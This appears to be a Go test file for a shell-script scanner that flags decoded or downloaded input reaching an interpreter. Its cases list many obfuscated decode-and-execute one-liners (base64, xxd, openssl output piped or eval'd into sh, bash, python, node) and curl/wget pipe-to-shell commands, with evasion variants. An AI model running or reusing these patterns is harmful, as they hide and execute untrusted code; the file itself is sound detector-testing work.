package decoderun

import (
	"strings"
	"testing"

	"github.com/ratuhin1122/taintwatch/internal/shellparse"
)

func TestDecodeRun(t *testing.T) {
	cases := []struct {
		script string
		match  bool
	}{
		{`base64 -d file.b64 | sh`, true},
		{`base64 --decode file.b64 | bash`, true},
		{`base64 -D file.b64 | zsh`, true},
		{`base64 -di file.b64 | python`, true},
		{`base64 -d file.b64 | python3.12 -`, true},
		{`base64 -d file.b64 | node`, true},
		{`base64 -d file.b64 | perl`, true},
		{`base64 -d file.b64 | ruby`, true},
		{`/usr/bin/base64 -d f | /bin/bash`, true},
		{`b'a'se64 '-d' f | ba'sh'`, true},
		{`env X=1 base64 --decode f | sudo -u root bash`, true},
		{`timeout 3 base64 -d f | env -i bash -s`, true},
		{`base64 -d f | cat | sh`, true},
		{`base64 -d f | tee log | sh`, true},
		{`base64 -d f | sed 's/x/y/g' | sh`, true},
		{`(base64 -d f) | sh`, true},
		{`{ base64 -d f; echo tail; } | sh`, true},
		{`eval "$(base64 -d f)"`, true},
		{"eval \"`base64 -d f`\"", true},
		{`eval $(cat f | base64 -d)`, true},
		{`eval "$(echo "$(base64 -d f)")"`, true},
		{`eval "$(printf '%s' "$(base64 -d f)")"`, true},
		{`source <(base64 --decode f)`, true},
		{`. <(base64 -D f)`, true},
		{`bash <(base64 -d f)`, true},
		{`python <(base64 -d f)`, true},
		{`bash < <(base64 -d f)`, true},
		{`bash -c "$(base64 -d f)"`, true},
		{`bash -lc "$(base64 -D f)"`, true},
		{`bash -c 'base64 -d f | sh'`, true},
		{`bash -c 'base64 -d f | sh' --version`, true},
		{`bash -c 'base64 -d f' | sh`, true},
		{`eval "$(bash -c 'base64 -d f')"`, true},
		{`eval "$(echo 'base64 -d f | sh')"`, true},
		{`bash -c "$(printf '%s' 'base64 -d f | sh')"`, true},
		{`printf '%s' 'base64 -d f' | bash | sh`, true},
		{`bash -c 'eval "$1"' _ "$(base64 -d f)"`, true},
		{`xxd -r -p f.hex | sh`, true},
		{`xxd -rp f.hex | node`, true},
		{`xxd -r -s 10 -p f.hex | sh`, true},
		{`openssl enc -d -aes-256-cbc -in f.enc | bash`, true},
		{`openssl enc -d -base64 -in f.enc | python`, true},
		{`python -c 'import base64; exec(base64.b64decode(x))'`, true},
		{`python3 -c 'exec(base64.urlsafe_b64decode(x).decode())'`, true},
		{`python -c'exec(base64.b64decode(x))'`, true},
		{`python -c 'from base64 import b64decode; exec(b64decode(x))'`, true},
		{`python -c 'import base64; data=base64.b64decode(x); exec(data)'`, true},
		{`python -c 'eval(compile(base64.b64decode(x),"data","exec"))'`, true},
		{`python -c 'exec(bytes.fromhex(x))'`, true},
		{`node -e 'eval(Buffer.from(x,"base64").toString())'`, true},
		{`node -e'eval(Buffer.from(x,"base64").toString())'`, true},
		{`node --eval='eval(Buffer.from(x,"base64").toString())'`, true},
		{`node -e 'let code=Buffer.from(x,"hex").toString(); eval(code)'`, true},
		{`node -e 'eval(atob(x))'`, true},
		{`python -c 'print(base64.b64decode(x).decode())' | sh`, true},
		{`bash <<<"$(base64 -d f)"`, true},
		{`python <<<"$(base64 -d f)"`, true},
		{`base64 -d <<< c2FmZQ== | sh`, true},
		{`cat <<<"$(base64 -d f)" | bash`, true},
		{`cat <<< 'base64 -d f | sh' | bash`, true},
		{`bash <<< 'base64 -d f | sh'`, true},
		{"bash <<'EOF'\nbase64 -d f | sh\nEOF", true},
		{`payload=$(base64 -d f); eval "$payload"`, true},
		{`payload=$(base64 -d f); bash <<<"$payload"`, true},
		{`runner=bash; base64 -d f | "$runner"`, true},
		{`base64 -d f > >(bash)`, true},
		{`for x in "$(base64 -d f | sh)"; do echo "$x"; done`, true},
		{`[[ "$(base64 -d f | sh)" == x ]]`, true},
		{`echo $(( $(base64 -d f | sh) ))`, true},
		{`$(base64 -d f)`, true},
		{`$(echo "$(base64 -d f)")`, true},
		{`payload=$(base64 -d f); $payload`, true},
		{`base64 -d f | bash /dev/stdin`, true},
		{`base64 -d f | source /dev/fd/0`, true},
		{`base64 -d f | sh -c "$(cat)"`, true},
		{`base64 -d file.b64 > out.bin`, false},
		{`base64 -d f > out.bin; bash -c 'echo safe'`, false},
		{`base64 -d f > out.bin; echo safe | sh`, false},
		{`base64 -d f > out.bin | sh`, false},
		{`base64 -d f > out.bin 1>&1 | sh`, false},
		{`base64 -d f | cat > out.bin | bash`, false},
		{`base64 -d f | cat safe.txt | bash`, false},
		{`base64 -d f | echo safe | bash`, false},
		{`base64 -d f | wc -c | sh`, false},
		{`echo "$(base64 -d f)"`, false},
		{`printf '%s' "$(base64 -d f)" > out.bin`, false},
		{`cat <(base64 -d f) > out.bin`, false},
		{`source <(echo safe); base64 -d f > out.bin`, false},
		{`eval 'echo safe'; base64 -d f > out.bin`, false},
		{`echo 'eval(base64.b64decode(x))'`, false},
		{`echo 'base64 -d f | sh'`, false},
		{`base64 f | bash`, false},
		{`base64 --help -d | sh`, false},
		{`base64 -d f | bash -c 'echo safe'`, false},
		{`base64 -d f | bash -n`, false},
		{`base64 -d f | bash -nc 'echo safe'`, false},
		{`base64 -d f | python -c 'print("safe")'`, false},
		{`base64 -d f | python program.py`, false},
		{`base64 -d f | python -m json.tool`, false},
		{`base64 -d f | node --check`, false},
		{`base64 -d f | node -c`, false},
		{`base64 -d f | ruby -c`, false},
		{`base64 -d f | perl -c`, false},
		{`xxd -p f | bash`, false},
		{`xxd -r -p f.hex out.bin | sh`, false},
		{`openssl enc -e -in f | bash`, false},
		{`openssl enc -d -in f -out out.bin | bash`, false},
		{`base64 -d -o out.bin f | sh`, false},
		{`python -c 'import base64; print(base64.b64decode(x))'`, false},
		{`python -c 'import base64; exec("print(1)")'`, false},
		{`python -c 'data=base64.b64decode(x); exec("print(1)")'`, false},
		{`python -c 'data=base64.b64decode(x); data="print(1)"; exec(data)'`, false},
		{`python -c 'compile(base64.b64decode(x),"data","exec")'`, false},
		{`python -c 'print("exec(base64.b64decode(x))")'`, false},
		{`python -c 'print("safe") # exec(base64.b64decode(x))'`, false},
		{`node -e 'console.log(Buffer.from(x,"base64").toString())'`, false},
		{`node -e 'eval("1+1"); Buffer.from(x,"base64")'`, false},
		{`node -e 'eval(Buffer.from("1+1","utf8").toString())'`, false},
		{`node -e 'console.log("eval(Buffer.from(x,base64))")'`, false},
		{`node -e '/* eval(Buffer.from(x,"base64")) */ console.log("safe")'`, false},
		{`node -e 'regex.exec(Buffer.from(x,"base64"))'`, false},
		{`node -e 'console.log(/eval(Buffer.from(x,"base64"))/)'`, false},
		{`payload=$(base64 -d f); payload='echo safe'; eval "$payload"`, false},
		{`eval <<<"$(base64 -d f)"`, false},
		{`cat <<<"$(base64 -d f)" > out.bin`, false},
		{`base64 -d f; echo safe | bash`, false},
		{`decode_example() { base64 -d f | sh; }`, false},
	}
	for _, tc := range cases {
		t.Run(tc.script, func(t *testing.T) {
			parsed := shellparse.Parse(tc.script)
			if parsed.AST == nil {
				t.Fatal("invalid test syntax")
			}
			got := Analyze(parsed)
			if got.Matched() != tc.match {
				t.Fatalf("got %+v want matched=%v", got, tc.match)
			}
			if tc.match && !got.Decode {
				t.Fatal("missing decode provenance", got)
			}
		})
	}
}
func TestDownloadExecution(t *testing.T) {
	for _, tc := range []struct {
		script string
		want   bool
	}{{`curl https://example.com/a | sh`, true}, {`wget -O - https://example.com/a | bash`, true}, {`wget -qO- https://example.com/a | bash`, true}, {`eval "$(curl https://example.com/a)"`, true}, {`curl -o out.bin https://example.com/a | bash`, false}, {`curl -oout.bin https://example.com/a | bash`, false}, {`wget https://example.com/a | bash`, false}, {`curl https://example.com/a > out; echo safe | bash`, false}} {
		got := Analyze(shellparse.Parse(tc.script))
		if got.Download != tc.want || got.Decode {
			t.Fatal(tc, got)
		}
	}
}
func TestBoundsAndMalformed(t *testing.T) {
	for _, s := range []string{`'`, strings.Repeat("(", 100) + "echo safe" + strings.Repeat(")", 100), strings.Repeat("a", (64<<10)+1)} {
		f := Analyze(shellparse.Parse(s))
		if !f.Incomplete || f.Matched() {
			t.Fatal(f)
		}
	}
}
func FuzzAnalyze(f *testing.F) {
	for _, s := range []string{`base64 -d f | sh`, `base64 -d f > out`, `eval "$(echo "$(base64 -d)")"`, `source <(xxd -r -p f)`, `node -e 'eval(Buffer.from(x,"base64"))'`, `python -c 'exec(base64.b64decode(x))'`, `bash <<<"$(openssl enc -d -in f)"`, `'`} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, source string) {
		p := shellparse.Parse(source)
		a := Analyze(p)
		b := Analyze(p)
		if a != b {
			t.Fatal("analysis mutated AST or leaked state")
		}
		if len(a.Evidence()) > 1 {
			t.Fatal("unbounded evidence")
		}
		for _, e := range a.Evidence() {
			if e != "decoded input reaches executable code" && e != "downloaded input reaches executable code" {
				t.Fatal("nonconstant evidence")
			}
		}
	})
}
